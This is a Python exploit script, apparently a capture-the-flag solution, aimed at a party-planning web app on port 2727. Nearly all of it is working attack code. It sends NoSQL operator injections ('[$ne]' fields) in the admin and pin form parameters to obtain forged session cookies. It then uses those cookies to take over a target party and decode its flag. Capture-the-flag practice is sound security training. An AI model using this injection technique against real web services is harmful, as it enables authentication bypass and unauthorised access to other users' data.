from requests import Session
import base64
import json
import sys

""" Idea:
    1. Attacker creates party (P1) with the admin name as a noSql injection to receive the name cookie with the noSqli
    2. Attacker creates second party (P2) with normal user to have a party which he can use to change his pw cookie
    2. Attacker uses updatepw option (P2) to receive the pw cookie with noSqli
    3. Use both cookies to login in flag party
"""

def create_party(s, x=False):
    data = {
      'party[title]': 'a',
      'party[guestlist]': 'c',
      'party[description]': 'd',
      'party[time]': '1',
      'party[loc]': '2'
    }

    if x:
        data['party[admin][$ne]'] = 'x'
    else:
        data['party[admin]'] = 'foobar'

    res = s.post(f'http://{IP}:2727/party', data=data, allow_redirects=False)

    if res.status_code == 302:
        jar = res.cookies
        redirect_url = res.headers['Location']
        res = s.get(f'http://{IP}:2727{redirect_url}', cookies=jar)

    pid = res.url.split('/')[-1]
    return pid

def update_password(s, pid, pw, x=False):
    url = f"http://{IP}:2727/party/{pid}"
    if x:
        data = {"pin[$ne]": "x"}
    else:
        data = {"pin": pw}
    res = s.post(url + "/updatepw", data=data)

    if res.status_code == 302:
        jar = res.cookies
        redirect_url = res.headers['Location']
        res = s.get(f'http://{IP}:2727/{redirect_url}', cookies=jar)
    return res

def get_details(s):
    url = f"http://{IP}:2727/party/{UUID}"
    res = s.get(url + "/details")
    return res.json()

def get_current_cookie(s):
    session_b64 = s.cookies["session"]
    session = base64.b64decode(session_b64.encode())
    return json.loads(session)

def exploit():
    s = Session()

    # get noSqli cookie
    print("* Create first party")
    create_party(s, x=True)
    pin = get_current_cookie(s)["pin"]
    print(f"  -> Created and pin is {pin}")

    # benign party
    s2 = Session()
    print("* Create second party")
    pid = create_party(s2, x=False)
    pin2 = get_current_cookie(s2)["pin"]
    print(f"  -> Created {pid} and pin is {pin2}")
    res1 = update_password(s2, pid, pin, x=False)
    print(f"  pwchange 1 -> \n{res1.text}\n")

    res2 = update_password(s, pid, "", x=True)
    print(f"  pwchange 2 -> \n{res2.text}\n")
    # print(s.cookies)

    details = get_details(s)
    return details

def print_flag(details):
    desc = base64.b64decode(details["description"].encode())
    admin = details["admin"][0]
    flag = "".join([chr(c ^ ord(details["admin"][0])) for c in desc])
    return flag

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: x.py <URL> <PARTY ID>")
        sys.exit(1)
    IP = sys.argv[1]
    UUID = sys.argv[2]
    p = exploit()
    print(print_flag(p))
